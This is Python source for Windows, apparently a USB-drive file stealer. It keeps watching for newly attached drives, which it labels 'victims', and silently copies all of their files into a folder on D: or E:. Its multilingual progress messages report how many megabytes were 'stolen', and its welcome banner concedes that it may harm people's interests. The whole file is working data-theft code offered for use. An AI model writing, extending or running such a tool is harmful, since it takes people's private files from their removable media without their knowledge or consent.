import os
import shutil
import time
import threading
import win32api

current = []
roots = 'D:\\######'
rooting = ''
threads = []
info = [0, 0]
ignored = 0
stolen = 0
cur = [0, 0]
cnt = 0
count = 0
count2 = 0
tot_start = 0
victims = []

text_template: list = [['{} was found.', 'Scanning', '[{}] from [{}]', '{} files and {} directories in total',
                        '\r{:^3.0f}%[{}->{}]{:.2f}s,{} files and {:.2f} Mb remaining. ',
                        "\r100%[{}->]{:.2f}s,0 files and 0 Mb remaining.                                ",
                        '\nCompleted in {:.2f}s.', 'stolen {:.2f} Mb, ignored {:.2f} Mb, {:.2f} Mb in total.'],
                       ['{} был найден', 'сканирует', '[{}] с [{}]', 'всего существует {} файлов и {} каталога',
                        '\r{:^3.0f}%[{}->{}]{:.2f}s,{} файлы и {:.2f} Мб все еще остается.',
                        '\r100%[{}->]{:.2f}s,0 файлы и 0 Mb все еще остается.                                ',
                        'Завершено за {:.2f} секунды.',
                        'украдено {:.2f} Мб, проигнорировано {:.2f} Мб, всего {:.2f} Мб.'],
                       ['检测到 {}', '扫描文件与文件夹', '[{}] 来自 [{}]', '共有{} 个文件和 {} 个目录',
                        '\r{:^3.0f}%[{}->{}]{:.2f}s,{} 个文件、{:.2f} Mb 剩余. ',
                        "\r100%[{}->]{:.2f}s,0 个文件、 0 Mb 剩余.                                ",
                        '\n于 {:.2f}s 内完成。', '攫取了 {:.2f} Mb 文件, 忽略了 {:.2f} Mb 文件, 文件总大小 {:.2f} Mb.']]
welcome_template = ['''Welcome from GTC Software Studio.
What this program can do may violate some people's bottom line, so please use it with caution.''',
                    '''Добро пожаловать из GTC Software Studio.
То, что может делать эта программа, может нарушить интересы некоторых людей, поэтому, пожалуйста, используйте ее с осторожностью.''',
                    '''感谢您使用 GTC Software Studio 的软件产品！
此程序能够做的事可能会损害一些人的利益，因此请谨慎使用。''']


def copyer(source, target):
    try:
        shutil.copy(source, target)
    except:
        pass


for root in range(ord('C'), ord('Z') + 1):
    try:
        os.listdir(chr(root) + ':\\')
        current.append(chr(root) + ':\\')
    except FileNotFoundError:
        pass
    except PermissionError:
        current.append(chr(root) + ':\\')

try:
    os.mkdir('D:\\######')
except FileExistsError:
    pass
except PermissionError:
    try:
        roots = 'E:\\######'
        os.mkdir('E:\\######')
    except FileExistsError:
        pass
lang = 998244353
while not 1 <= lang <= len(text_template):
    lang = int(input('''Choose one language to start:
1.English
2.Русский
3.中文（简体）
Enter the number of your language HERE: ''')) - 1

print(welcome_template[lang])


def dfs(source):
    global roots, stolen, ignored
    dirs = os.listdir(source)

    for element in dirs:
        try:
            temp = ''
            temp_list = os.path.join(source, element).split('\\')[1:]
            for i in temp_list[:-1]:
                temp = temp + i + '\\'
            temp = temp + temp_list[-1]
            if os.path.isdir(os.path.join(source, element)):
                info[1] += 1
                os.makedirs(os.path.join(rooting, temp))
                dfs(os.path.join(source, element))
            else:
                if os.path.getsize(os.path.join(source, element)) / 1048576 > 0:
                    # if True:
                    info[0] += 1
                    stolen += os.path.getsize(os.path.join(source, element)) / 1048576
                    threads.append([threading.Thread(target=copyer,
                                                     args=(
                                                         os.path.join(source, element), os.path.join(rooting, temp),)),
                                    os.path.getsize(os.path.join(source, element))])
                    # shutil.copy(os.path.join(source, element), os.path.join(rooting, temp))
                    # print(element, ":", os.path.getsize(os.path.join(source, element)) / 1024, 'KB')
                else:
                    ignored += os.path.getsize(os.path.join(source, element)) / 1048576
        except FileNotFoundError:
            pass


do_exit = False


def controller():
    global cnt, count2
    for i in range(len(threads)):
        try:
            cnt += 1
            count2 += threads[i][1]
            threads[i][0].start()
            threads[i][0].join()
        except RuntimeError:
            continue


def run(root):
    global threads, ignored, stolen, rooting, cnt, cur, tot_start, info, current, count2, count
    threads.clear()
    disk_info = win32api.GetVolumeInformation("{}:\\".format(root[0]))
    print(text_template[lang][0].format(disk_info[0]))
    print(text_template[lang][1], end='')
    for i in range(3):
        print('.', end='')
        time.sleep(0.1)
    print()
    threads = []
    info = [0, 0]
    ignored = 0
    stolen = 0
    cur = [0, 0]
    cnt = 0
    count = 0
    count2 = 0
    t = text_template[lang][2].format(str(time.time()), disk_info[0])
    os.mkdir(os.path.join(roots, t))
    rooting = os.path.join(roots, t)
    dfs(root)
    print(text_template[lang][3].format(info[0], info[1]))
    threads.sort(key=lambda x: x[1])
    cur = [0, info[0] - 1]
    count = info[0]
    cnt = 0
    start = time.perf_counter()

    threading.Thread(target=controller).start()
    while cnt <= count:
        dur = time.perf_counter() - start
        a = "*" * int(count2 / 1048576 / stolen * 50)
        b = "." * int(50 - (count2 / 1048576 / stolen * 50))
        print(text_template[lang][4].format(count2 / 1048576 / stolen * 100, a,
                                            b,
                                            dur, count - cnt,
                                            stolen - count2 / 1048576), end="")
        if cnt == count:
            break

    print(text_template[lang][5].format('*' * 50, dur),
          end="")
    print(text_template[lang][6].format(time.perf_counter() - start))
    print(text_template[lang][7].format(stolen, ignored, stolen + ignored))


while True:
    for root in [chr(x) + ':\\' for x in range(ord('C'), ord('Z') + 1)]:
        try:
            os.listdir(root)
            if root in victims:
                continue
        except FileNotFoundError:
            if root in current:
                current.remove(root)
            try:
                victims.remove(root)
            except ValueError:
                pass
            continue
        except PermissionError:
            if root in current:
                current.remove(root)
            try:
                victims.remove(root)
            except ValueError:
                pass
            continue
        if root in current:
            continue
        # time.sleep(45)

        run(root)
        victims.append(root)
    time.sleep(1)
# input('Press Enter to exit...')
